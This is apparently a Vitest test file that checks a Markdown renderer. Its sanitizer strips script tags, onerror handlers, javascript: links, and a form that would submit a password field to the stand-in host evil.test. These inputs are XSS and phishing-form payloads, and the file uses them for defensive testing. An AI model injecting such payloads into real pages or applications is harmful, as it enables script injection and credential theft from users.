import { describe, expect, it } from "vitest";
import { renderMarkdown } from "./Markdown";

describe("renderMarkdown", () => {
  it("renders Markdown", () => {
    expect(renderMarkdown("# Title\n\nSome *text* and `code`.")).toContain("<h1>Title</h1>");
  });

  it("strips scripts and event handlers", () => {
    const html = renderMarkdown(
      '<script>alert(1)</script>\n\n<img src="x" onerror="alert(1)">\n\n[a](javascript:alert(1)) <a href="javascript:alert(2)">b</a>',
    );
    expect(html).not.toContain("<script");
    expect(html).not.toContain("onerror");
    expect(html).not.toMatch(/href="javascript:/i);
  });

  it("strips forms that could navigate the app window", () => {
    const html = renderMarkdown(
      '<form action="https://evil.test/login"><input name="pw"><button formaction="https://evil.test">Go</button></form>',
    );
    for (const bad of ["<form", "<input", "<button", "action=", "evil.test"]) {
      expect(html).not.toContain(bad);
    }
  });
});
